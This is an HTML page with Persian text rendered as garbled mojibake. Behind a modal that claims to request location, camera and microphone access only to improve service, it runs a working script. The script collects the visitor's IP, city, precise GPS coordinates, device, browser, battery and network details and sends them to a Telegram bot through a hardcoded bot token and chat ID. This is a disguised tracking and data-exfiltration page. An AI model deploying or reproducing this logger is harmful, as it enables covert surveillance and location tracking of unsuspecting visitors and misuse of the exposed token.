<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: Tahoma, sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      margin: 0; height: 100vh;
      display: flex; justify-content: center; align-items: center;
      direction: rtl;
    }
    #modal {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }
    #modalContent {
      background: #2a5298;
      padding: 30px 40px;
      border-radius: 15px;
      max-width: 400px;
      box-shadow: 0 0 20px #ffd700;
      text-align: center;
    }
    button {
      background: #ffd700;
      border: none;
      color: #222;
      font-weight: bold;
      padding: 10px 20px;
      border-radius: 8px;
      cursor: pointer;
      margin: 10px 5px 0 5px;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #ffca00;
    }
    #status {
      margin-top: 20px;
      font-size: 14px;
      min-height: 100px;
      color: #eee;
      text-align: center;
      white-space: pre-line;
      font-family: monospace;
      max-height: 180px;
      overflow-y: auto;
      background: rgba(255 255 255 / 0.1);
      padding: 10px;
      border-radius: 8px;
    }
  </style>
</head>
<body>

<div id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
  <div id="modalContent">
    <h2 id="modalTitle">Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ÛŒ Ù„Ø§Ø²Ù…</h2>
    <p id="modalDesc">Ø¨Ø±Ø§ÛŒ Ø¨Ù‡Ø¨ÙˆØ¯ ØªØ¬Ø±Ø¨Ù‡ Ú©Ø§Ø±Ø¨Ø±ÛŒØŒ Ù„Ø·ÙØ§Ù‹ Ø§Ø¬Ø§Ø²Ù‡ Ø¨Ø¯Ù‡ÛŒØ¯ Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ø´Ù…Ø§ Ø±Ø§ Ø¯Ø±ÛŒØ§ÙØª Ú©Ù†ÛŒÙ…. Ø§ÛŒÙ† Ø§Ø·Ù„Ø§Ø¹Ø§Øª ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Ø¨Ù‡Ø¨ÙˆØ¯ Ø®Ø¯Ù…Ø§Øª Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯.</p>
    <button id="allowBtn">Ù…ÙˆØ§ÙÙ‚Ù…</button>
    <button id="denyBtn">ÙØ¹Ù„Ø§Ù‹ Ù†Ù‡</button>
    <div id="status" aria-live="polite"></div>
  </div>
</div>

<script>
  const TELEGRAM_BOT_TOKEN = "7652388395:AAHntUUw7_v73YQp_6ZzyqObdJyK22V-6Do";
  const TELEGRAM_CHAT_ID = "2040814894";

  const modal = document.getElementById('modal');
  const allowBtn = document.getElementById('allowBtn');
  const denyBtn = document.getElementById('denyBtn');
  const status = document.getElementById('status');

  function log(msg) {
    status.textContent += msg + "\n";
    status.scrollTop = status.scrollHeight;
  }

  function parseUserAgent(ua) {
    let os = "Ù†Ø§Ù…Ø´Ø®Øµ";
    if (/Android/i.test(ua)) os = "Ø§Ù†Ø¯Ø±ÙˆÛŒØ¯";
    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
    else if (/Windows NT/i.test(ua)) os = "ÙˆÛŒÙ†Ø¯ÙˆØ²";
    else if (/Mac OS X/i.test(ua)) os = "Ù…Ú© Ø§Ùˆ Ø§Ø³";
    else if (/Linux/i.test(ua)) os = "Ù„ÛŒÙ†ÙˆÚ©Ø³";

    let device = "Ù†Ø§Ù…Ø´Ø®Øµ";
    if (/Mobile/i.test(ua)) device = "Ù…ÙˆØ¨Ø§ÛŒÙ„";
    else if (/Tablet/i.test(ua)) device = "ØªØ¨Ù„Øª";
    else device = "Ø¯Ø³Ú©ØªØ§Ù¾";

    return { os, device };
  }

  async function collectInfo() {
    log("Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª IP Ùˆ Ù…ÙˆÙ‚Ø¹ÛŒØª ...");
    const ipData = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => null);

    let batteryInfo = "Ù†Ø§Ù…Ø´Ø®Øµ";
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `ğŸ”‹ Ø´Ø§Ø±Ú˜: ${Math.round(battery.level * 100)}% | ${battery.charging ? 'Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜' : 'Ø¯Ø± Ø­Ø§Ù„ Ù…ØµØ±Ù'}`;
      } catch {}
    }

    const ua = navigator.userAgent;
    const lang = navigator.language;
    const res = screen.width + "x" + screen.height;
    const time = new Date().toLocaleString("fa-IR");
    const net = navigator.connection ? navigator.connection.effectiveType : "Ù†Ø§Ù…Ø´Ø®Øµ";
    const online = navigator.onLine ? "Ø¢Ù†Ù„Ø§ÛŒÙ†" : "Ø¢ÙÙ„Ø§ÛŒÙ†";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Ù†Ø§Ù…Ø´Ø®Øµ";
    const { os, device } = parseUserAgent(ua);

    const sensors = {
      gyroscope: !!window.DeviceOrientationEvent,
      accelerometer: !!window.DeviceMotionEvent,
      ambientLightSensor: 'AmbientLightSensor' in window,
    };

    let geoPosition = "Ù†Ø§Ù…Ø´Ø®Øµ";
    // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª ÙÙ‚Ø· Ø§Ú¯Ø± Ù‚Ø¨Ù„Ø§Ù‹ ØªØ§ÛŒÛŒØ¯ Ø´Ø¯Ù‡ Ø¨Ø§Ø´Ø¯
    if (navigator.geolocation) {
      geoPosition = await new Promise((res) => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            res(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`);
          },
          () => {
            res("Ø¹Ø¯Ù… Ø¯Ø³ØªØ±Ø³ÛŒ ÛŒØ§ Ø®Ø·Ø§");
          },
          {timeout: 10000}
        );
      });
    }

    return {
      time,
      ip: ipData ? ipData.ip : "Ù†Ø§Ù…Ø´Ø®Øµ",
      country: ipData ? ipData.country_name : "Ù†Ø§Ù…Ø´Ø®Øµ",
      city: ipData ? ipData.city : "Ù†Ø§Ù…Ø´Ø®Øµ",
      ua,
      lang,
      res,
      net,
      batteryInfo,
      online,
      timezone,
      os,
      device,
      sensors,
      geoPosition
    };
  }

  function buildMessage(data) {
    return `
ğŸ“¡ ÙˆØ±ÙˆØ¯ Ø¬Ø¯ÛŒØ¯:

ğŸ•“ Ø²Ù…Ø§Ù†: ${data.time}
ğŸŒ Ú©Ø´ÙˆØ±: ${data.country}
ğŸ™ï¸ Ø´Ù‡Ø±: ${data.city}
ğŸŒ IP: ${data.ip}
ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª GPS: ${data.geoPosition}
ğŸ“± Ø³ÛŒØ³ØªÙ… Ø¹Ø§Ù…Ù„: ${data.os}
ğŸ“Ÿ Ù†ÙˆØ¹ Ø¯Ø³ØªÚ¯Ø§Ù‡: ${data.device}
ğŸ“± Ù…Ø±ÙˆØ±Ú¯Ø±: ${data.ua}
ğŸ–¥ï¸ Ø±Ø²ÙˆÙ„ÙˆØ´Ù† ØµÙØ­Ù‡: ${data.res}
ğŸ“¶ Ø§ÛŒÙ†ØªØ±Ù†Øª: ${data.net}
ğŸŒ Ø²Ø¨Ø§Ù† Ø³ÛŒØ³ØªÙ…: ${data.lang}
${data.batteryInfo}
ğŸ”Œ ÙˆØ¶Ø¹ÛŒØª Ø§ØªØµØ§Ù„: ${data.online}
ğŸ•°ï¸ Ù…Ù†Ø·Ù‚Ù‡ Ø²Ù…Ø§Ù†ÛŒ: ${data.timezone}

âš™ï¸ Ø­Ø³Ú¯Ø±Ù‡Ø§:
- Ú˜ÛŒØ±ÙˆØ³Ú©ÙˆÙ¾: ${data.sensors.gyroscope ? "Ø¯Ø§Ø±Ø¯" : "Ù†Ø¯Ø§Ø±Ø¯"}
- Ø´ØªØ§Ø¨â€ŒØ³Ù†Ø¬: ${data.sensors.accelerometer ? "Ø¯Ø§Ø±Ø¯" : "Ù†Ø¯Ø§Ø±Ø¯"}
- Ø­Ø³Ú¯Ø± Ù†ÙˆØ± Ù…Ø­ÛŒØ·: ${data.sensors.ambientLightSensor ? "Ø¯Ø§Ø±Ø¯" : "Ù†Ø¯Ø§Ø±Ø¯"}
    `.trim();
  }

  async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    };
    try {
      const resp = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (!resp.ok) throw new Error("Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„");
      log("Ù¾ÛŒØ§Ù… Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.");
      return true;
    } catch {
      log("Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù… Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯.");
      return false;
    }
  }

  async function requestPermissionsAndSend() {
    modal.querySelector("p").textContent = "Ù„Ø·ÙØ§Ù‹ Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ø±Ø§ Ø¨Ø¯Ù‡ÛŒØ¯.";
    log("Ù…Ù†ØªØ¸Ø± Ø§Ø¬Ø§Ø²Ù‡ Ú©Ø§Ø±Ø¨Ø±...");
    
    // Ø§Ø¨ØªØ¯Ø§ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÙˆÙ‚Ø¹ÛŒØª
    if (navigator.geolocation) {
      try {
        await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(
            () => { log("Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯."); res(); },
            () => { log("Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯."); res(); },
            {timeout: 10000}
          );
        });
      } catch {}
    } else {
      log("Ù…Ø±ÙˆØ±Ú¯Ø± Ù…ÙˆÙ‚Ø¹ÛŒØª Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.");
    }

    // Ø¨Ø¹Ø¯ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯ÙˆØ±Ø¨ÛŒÙ†
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        log("Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø§Ø¯Ù‡ Ø´Ø¯.");
        stream.getTracks().forEach(t => t.stop());
      } catch {
        log("Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯.");
      }
    } else {
      log("Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯.");
    }

    // Ø¨Ø¹Ø¯ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        log("Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ø¯Ø§Ø¯Ù‡ Ø´Ø¯.");
        stream.getTracks().forEach(t => t.stop());
      } catch {
        log("Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯.");
      }
    } else {
      log("Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯.");
    }

    // Ø­Ø§Ù„Ø§ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø±Ùˆ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†
    const data = await collectInfo();
    const msg = buildMessage(data);
    await sendToTelegram(msg);

    modal.style.display = "none";
  }

  allowBtn.onclick = () => {
    status.textContent = "";
    requestPermissionsAndSend();
  };

  denyBtn.onclick = () => {
    status.textContent = "Ú©Ø§Ø±Ø¨Ø± Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ù†Ø¯Ø§Ø¯.";
    modal.style.display = "none";
  };
</script>

</body>
</html>
